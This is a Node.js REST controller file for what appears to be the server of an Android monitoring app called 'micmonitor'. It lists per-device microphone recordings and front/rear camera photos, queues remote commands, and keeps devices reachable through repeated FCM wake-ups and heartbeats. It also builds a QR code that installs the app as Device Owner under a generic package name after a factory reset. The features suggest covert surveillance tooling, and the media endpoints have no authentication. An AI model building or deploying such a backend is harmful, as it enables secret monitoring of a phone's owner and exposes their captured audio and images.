/**
 * REST API controllers
 */

const fs = require("fs");
const path = require("path");
const crypto = require("crypto");
const QRCode = require("qrcode");
const deviceStore = require("../models/deviceStore");
const { scheduleWake } = require("../services/wakeRetryService");
const { ICE_SERVERS, RECORDINGS_DIR, PHOTOS_DIR, UPDATES_DIR } = require("../config");

function health(req, res) {
  res.json({ status: "ok", devices: deviceStore.size(), ts: Date.now() });
}

// ── Layer 2 & 12: HTTP Fallback & Heartbeat ──

function sync(req, res) {
  const deviceId = req.query.deviceId || req.headers["x-device-id"];
  if (!deviceId) return res.status(400).json({ error: "Missing deviceId" });
  
  // Register heartbeat since they reached out
  deviceStore.updateHeartbeat(deviceId);
  
  // Get queued commands (Layer 9)
  const commands = deviceStore.popQueuedCommands(deviceId);
  
  // Sync state (Layer 10)
  const sessionState = deviceStore.getSessionState(deviceId);

  res.json({
    commands,
    sessionState,
    ts: Date.now()
  });
}

function heartbeat(req, res) {
  const deviceId = req.body.deviceId || req.query.deviceId || req.headers["x-device-id"];
  if (!deviceId) return res.status(400).json({ error: "Missing deviceId" });
  
  deviceStore.updateHeartbeat(deviceId);
  
  // Also check if there's any pending commands - if so tell them to sync
  const commands = deviceStore.popQueuedCommands(deviceId);
  
  res.json({ status: "ok", commandsAvailable: commands.length > 0, commands });
}

function webrtcConfig(req, res) {
  res.json({
    iceServers: ICE_SERVERS,
    tokenRequired: false,
  });
}

function listRecordings(req, res) {
  const files = fs
    .readdirSync(RECORDINGS_DIR)
    .filter((f) => f.endsWith(".mp3") || f.endsWith(".wav"))
    .map((f) => ({
      name: f,
      size: fs.statSync(path.join(RECORDINGS_DIR, f)).size,
      url: `/recordings/${f}`,
    }));
  res.json(files);
}

function listPhotos(req, res) {
  const deviceId = req.query.deviceId;
  const files = fs
    .readdirSync(PHOTOS_DIR)
    .filter((f) => /\.(jpg|jpeg|png)$/i.test(f))
    .filter((f) => {
      if (deviceId) {
        const match = f.match(/^photo_([a-z0-9_-]+)_/i);
        return match && match[1] === deviceId;
      }
      return true;
    })
    .map((f) => {
      const match = f.match(/^photo_([a-z0-9_-]+)_(front|rear)_(\d+)\.(jpg|jpeg|png)$/i);
      return {
        name: f,
        size: fs.statSync(path.join(PHOTOS_DIR, f)).size,
        url: `/photos/${f}`,
        deviceId: match ? match[1] : null,
        camera: match ? match[2] : null,
        ts: match ? parseInt(match[3], 10) : null,
      };
    })
    .sort((a, b) => (b.ts || 0) - (a.ts || 0));
  res.json(files);
}

function versionInfo(req, res) {
  function resolveLatestApkInUpdatesDir() {
    try {
      const files = fs.readdirSync(UPDATES_DIR).filter((f) => f.toLowerCase().endsWith(".apk"));
      if (files.length === 0) return null;

      let newest = null;
      for (const file of files) {
        const full = path.join(UPDATES_DIR, file);
        const st = fs.statSync(full);
        if (!newest || st.mtimeMs > newest.mtimeMs) {
          newest = { fileName: file, size: st.size, mtimeMs: st.mtimeMs };
        }
      }
      return newest;
    } catch (e) {
      return null;
    }
  }

  const versionFile = path.join(UPDATES_DIR, "version.json");
  let versionInfo = {
    versionCode: 1,
    versionName: "1.0.0",
    apkUrl:
      process.env.APK_DOWNLOAD_URL ||
      "https://github.com/Durgesh-Vishwakarma/monitor/releases/download/apk/app-release.apk",
    changelog: "Initial release",
    minVersionCode: 1,
    updatedAt: new Date().toISOString(),
    apkAvailable: true,
  };

  if (fs.existsSync(versionFile)) {
    try {
      const data = JSON.parse(fs.readFileSync(versionFile, "utf8"));
      versionInfo = { ...versionInfo, ...data };
    } catch (e) {
      console.error("Error reading version.json:", e.message);
    }
  }

  // Force-update correctness:
  // Always point to the newest APK present in `backend/updates/` so "force_update"
  // never downloads an old file referenced by a stale version.json.
  const latestApk = resolveLatestApkInUpdatesDir();
  if (latestApk) {
    versionInfo.apkUrl = `/updates/${latestApk.fileName}?v=${versionInfo.versionCode}`;
    versionInfo.apkSize = latestApk.size;
    versionInfo.apkAvailable = true;
  }

  res.set(
    "Cache-Control",
    "no-store, no-cache, must-revalidate, proxy-revalidate",
  );
  res.set("Pragma", "no-cache");
  res.set("Expires", "0");
  res.json(versionInfo);
}

async function cacheApkChecksum(req, res) {
  const apkUrl =
    process.env.APK_DOWNLOAD_URL ||
    "https://github.com/Durgesh-Vishwakarma/monitor/releases/download/apk/app-release.apk";

  try {
    console.log(`📥 Fetching APK to cache checksum: ${apkUrl}`);
    const response = await fetch(apkUrl);
    if (!response.ok) throw new Error(`HTTP ${response.status}: ${response.statusText}`);
    const buffer = Buffer.from(await response.arrayBuffer());

    const sha256 = crypto.createHash("sha256").update(buffer).digest("base64");
    const checksum = sha256.replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");

    const versionFile = path.join(UPDATES_DIR, "version.json");
    let versionInfo = {};
    if (fs.existsSync(versionFile)) {
      try {
        versionInfo = JSON.parse(fs.readFileSync(versionFile, "utf8"));
      } catch (e) {
        console.warn("Error reading existing version.json:", e.message);
      }
    }
    versionInfo.cachedChecksum = checksum;
    versionInfo.checksumCachedAt = new Date().toISOString();
    versionInfo.apkSize = buffer.length;
    versionInfo.apkUrl = apkUrl;
    fs.writeFileSync(versionFile, JSON.stringify(versionInfo, null, 2));

    console.log(`✅ Checksum cached: ${checksum.substring(0, 16)}...`);
    res.json({
      checksum,
      size: buffer.length,
      cached: true,
      cachedAt: versionInfo.checksumCachedAt,
    });
  } catch (e) {
    console.error(`❌ Checksum cache failed: ${e.message}`);
    res.status(500).json({ error: e.message });
  }
}

async function provisioningQr(req, res) {
  const apkDownloadUrl =
    process.env.APK_DOWNLOAD_URL ||
    "https://github.com/Durgesh-Vishwakarma/monitor/releases/download/apk/app-release.apk";

  const serverUrl =
    process.env.RENDER_EXTERNAL_URL || `${req.protocol}://${req.get("host")}`;

  const versionFile = path.join(UPDATES_DIR, "version.json");
  let versionInfo = {
    versionCode: 1,
    versionName: "1.0.0",
    changelog: "Latest release",
    updatedAt: new Date().toISOString(),
  };
  let checksum = null;
  let apkSize = 0;

  if (fs.existsSync(versionFile)) {
    try {
      const data = JSON.parse(fs.readFileSync(versionFile, "utf8"));
      versionInfo = { ...versionInfo, ...data };
      checksum = data.cachedChecksum || null;
      apkSize = data.apkSize || 0;
    } catch (e) {
      console.error("Error reading version.json:", e.message);
    }
  }

  if (!checksum) {
    console.log("⚠️  No cached checksum — fetching APK now (slow path)...");
    try {
      const response = await fetch(apkDownloadUrl);
      if (!response.ok) throw new Error(`HTTP ${response.status}: ${response.statusText}`);
      const buffer = Buffer.from(await response.arrayBuffer());
      apkSize = buffer.length;
      const sha256 = crypto.createHash("sha256").update(buffer).digest("base64");
      checksum = sha256.replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");

      versionInfo.cachedChecksum = checksum;
      versionInfo.apkSize = apkSize;
      versionInfo.checksumCachedAt = new Date().toISOString();
      fs.writeFileSync(versionFile, JSON.stringify(versionInfo, null, 2));
      console.log(`✅ Checksum computed and cached: ${checksum.substring(0, 16)}...`);
    } catch (err) {
      console.error(`❌ Failed to fetch APK: ${err.message}`);
      return res.status(502).json({
        error: "APK fetch failed",
        message: `Could not download APK from ${apkDownloadUrl}: ${err.message}. Run POST /api/cache-apk-checksum first.`,
      });
    }
  } else {
    console.log(
      `✅ Using cached checksum: ${checksum.substring(0, 16)}... (cached at ${versionInfo.checksumCachedAt})`,
    );
  }

  const provisioningData = {
    "android.app.extra.PROVISIONING_DEVICE_ADMIN_COMPONENT_NAME":
      "com.device.services.app/com.micmonitor.app.DeviceAdminReceiver",
    "android.app.extra.PROVISIONING_DEVICE_ADMIN_PACKAGE_DOWNLOAD_LOCATION":
      apkDownloadUrl,
    "android.app.extra.PROVISIONING_DEVICE_ADMIN_PACKAGE_CHECKSUM": checksum,
    "android.app.extra.PROVISIONING_SKIP_ENCRYPTION": false,
  };

  res.set(
    "Cache-Control",
    "no-store, no-cache, must-revalidate, proxy-revalidate",
  );
  res.set("Pragma", "no-cache");
  res.set("Expires", "0");

  let qrDataUrl = null;
  try {
    qrDataUrl = await QRCode.toDataURL(JSON.stringify(provisioningData), {
      errorCorrectionLevel: "L",
      margin: 4,
      width: 500,
    });
  } catch (e) {
    console.warn("Failed to pre-generate QR data URL:", e.message);
  }

  res.json({
    provisioningData,
    qrContent: JSON.stringify(provisioningData),
    qrDataUrl,
    serverUrl,
    apkUrl: apkDownloadUrl,
    checksum,
    apkSize: apkSize,
    apkVersionTag: Date.now(),
    apkLastModified: versionInfo.updatedAt,
    versionCode: versionInfo.versionCode,
    versionName: versionInfo.versionName,
    changelog: versionInfo.changelog,
    updatedAt: versionInfo.updatedAt,
    instructions: [
      "1. Factory reset the device",
      "2. On Welcome screen, tap 6 times quickly anywhere",
      "3. QR scanner will appear",
      "4. Scan the QR code generated from this data",
      "5. Device will download APK and set as Device Owner automatically",
    ],
  });
}

function saveFcmToken(req, res) {
  const { deviceId, token } = req.body;
  if (!deviceId || !token) {
    return res.status(400).json({ error: "Missing deviceId or token" });
  }

  console.log(`📡 Saving FCM token for device: ${deviceId}`);
  deviceStore.saveFcmToken(deviceId, token);
  res.json({ status: "ok", message: "Token saved persistently" });
}

async function triggerWakeUp(req, res) {
  const { deviceId } = req.params;
  if (!deviceId) return res.status(400).json({ error: "Missing deviceId" });
  console.log(`🔔 Triggering Layer 4 Wake-up for device: ${deviceId}`);

  const token = deviceStore.getFcmToken(deviceId);
  if (!token) {
    return res.status(404).json({ error: "No FCM token found for this device" });
  }

  const ok = scheduleWake(deviceId, { maxAttempts: 6, intervalMs: 10_000 });
  if (ok) {
    res.json({ status: "ok", message: "Wake retry scheduled via FCM" });
  } else {
    res.status(500).json({ error: "Failed to schedule FCM wake-up" });
  }
}

module.exports = {
  health,
  webrtcConfig,
  listRecordings,
  listPhotos,
  versionInfo,
  cacheApkChecksum,
  provisioningQr,
  sync,
  heartbeat,
  saveFcmToken,
  triggerWakeUp,
};
